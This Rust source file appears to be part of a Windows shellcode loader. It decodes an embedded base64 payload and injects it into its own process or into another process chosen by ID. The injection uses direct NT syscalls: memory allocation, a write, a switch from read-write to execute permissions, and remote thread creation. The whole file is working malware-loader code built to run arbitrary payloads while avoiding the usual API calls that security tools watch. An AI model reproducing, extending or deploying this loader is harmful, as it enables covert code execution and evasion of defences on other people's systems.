use std::error::Error;

#[allow(unused_imports)]
use crate::debug_error;
#[allow(unused_imports)]
use crate::debug_ok_msg;
#[allow(unused_imports)]
use crate::debug_base_msg;
#[allow(unused_imports)]
use crate::debug_base_hex;
#[allow(unused_imports)]
use crate::debug_success_msg;
#[allow(unused_imports)]
use crate::debug_base;

use crate::winapi::{syscall_wrapper::SyscallWrapper, types::HANDLE};
use crate::winapi::constants::STATUS_SUCCESS;

#[allow(dead_code)]
pub fn do_load()
{
    let shell_code = get_shell_code();
    debug_success_msg!(format!("Shellcode loaded, size = {}", shell_code.len()));
    match load(shell_code) {
        Ok(_) => {},
        Err(e) => {
            debug_error!(e);
        }
    }
}

#[allow(dead_code)]
#[cfg(all(feature = "payload_b64"))]
fn get_shell_code() -> Vec<u8> {
    let base64_shell_code = include_str!("payload.b64");
    crate::helpers::base64_to_vec(base64_shell_code)
}

#[cfg(all(feature = "inject_self", not(feature = "inject_proc_id"), not(feature = "inject_proc_name")))]
fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
    let ntdll = SyscallWrapper::new();
    let process_handle: HANDLE = -1;

    inner_load(&ntdll, shell_code, process_handle, true)
}

#[cfg(all(feature = "inject_proc_id", not(feature = "inject_self"), not(feature = "inject_proc_name")))]
fn load(shell_code: Vec<u8>) -> Result<(), Box<dyn Error>> {
    use crate::winapi::constants::PROCESS_ALL_ACCESS;

    let ntdll = SyscallWrapper::new();
    let process_id = String::from(env!("PROCESS_ID")).parse().unwrap();
    let mut process_handle: HANDLE = 0;

    crate::debug_ok_msg!(format!("Call to NtOpenProcess"));
    let mut res = ntdll.nt_open_process(&mut process_handle, PROCESS_ALL_ACCESS, process_id);
    crate::debug_info_msg!(format!("Call to NtOpenProcess : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        return Err(Box::from("Failed to get Process Handle!"));
    }
    debug_success_msg!(format!("Process Handle #{} retrieved from process with id {}", process_handle, process_id ));

    inner_load(&ntdll, shell_code, process_handle, true)?;

    crate::debug_ok_msg!(format!("Call to NtClose"));
    res = ntdll.nt_close(process_handle);
    crate::debug_info_msg!(format!("Call to NtClose : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        return Err(Box::from("Failed to close Process Handle!"));
    }
    debug_success_msg!(format!("Process Handle closed"));

    Ok(())
}


fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDLE, wait: bool) -> Result<(), Box<dyn Error>> {

    use crate::winapi::constants::{MEM_RESERVE, MEM_COMMIT, PAGE_READWRITE, PAGE_EXECUTE_READ, THREAD_ALL_ACCESS};

    let mut size: usize = shell_code.len();
    let mut address: usize = 0;

    crate::debug_ok_msg!(format!("Call to NtAllocateVirtualMemory"));
    let mut res = ntdll.nt_allocate_virtual_memory(process_handle, &mut address,  &mut size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    crate::debug_info_msg!(format!("Call to NtAllocateVirtualMemory : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        return Err(Box::from(format!("Failed to allocate memory (size = {})!", size)));
    }
    debug_success_msg!(format!("Memory allocated : {}b at {:#x}", size, address));


    let mut old_protect= 0u32;
    crate::debug_ok_msg!(format!("Call to NtProtectVirtualMemory"));
    res =  ntdll.nt_protect_virtual_memory(process_handle, &mut address, &mut size, PAGE_READWRITE, &mut old_protect);
    crate::debug_info_msg!(format!("Call to NtProtectVirtualMemory : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        return Err(Box::from("Failed to change memory protection!"));
    }
    debug_success_msg!("Memory protection changed to PAGE_READWRITE");

    let mut nb_of_bytes_written = 0usize;
    crate::debug_ok_msg!(format!("Call to NtWriteVirtualMemory"));
    res =  ntdll.nt_write_virtual_memory(process_handle, address, shell_code.as_ptr() as usize, shell_code.len(), &mut nb_of_bytes_written);
    crate::debug_info_msg!(format!("Call to NtWriteVirtualMemory : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        return Err(Box::from("Failed to write memory!"));
    }
    debug_success_msg!("Memory written");

    crate::debug_ok_msg!(format!("Call to NtProtectVirtualMemory"));
    res =  ntdll.nt_protect_virtual_memory(process_handle, &mut address, &mut size, PAGE_EXECUTE_READ, &mut old_protect);
    crate::debug_info_msg!(format!("Call to NtProtectVirtualMemory : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        return Err(Box::from("Failed to change memory protection!"));
    }
    debug_success_msg!("Memory protection changed to PAGE_EXECUTE_READ");
    
    let mut thread_handle: HANDLE = 0;
    crate::debug_ok_msg!(format!("Call to NtCreateThreadEx"));
    res =  ntdll.nt_create_thread_ex(&mut thread_handle, THREAD_ALL_ACCESS,process_handle, address);
    crate::debug_info_msg!(format!("Call to NtCreateThreadEx : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        return Err(Box::from("Failed to start thread!"));
    }
    debug_success_msg!("Thread executed");

    if wait {
        crate::debug_ok_msg!(format!("Call to NtWaitForSingleObject"));
        res =  ntdll.nt_wait_for_single_object(thread_handle);
        crate::debug_info_msg!(format!("Call to NtWaitForSingleObject : Result = {:#x}", res));
        if res != STATUS_SUCCESS {
            return Err(Box::from("Failed to wait!"));
        }
        debug_success_msg!("Thread ended");
    }

    crate::debug_ok_msg!(format!("Call to NtClose"));
    res = ntdll.nt_close(thread_handle);
    crate::debug_info_msg!(format!("Call to NtClose : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        return Err(Box::from("Failed to close Thread Handle!"));
    }
    debug_success_msg!(format!("Thread Handle closed"));

    Ok(())
}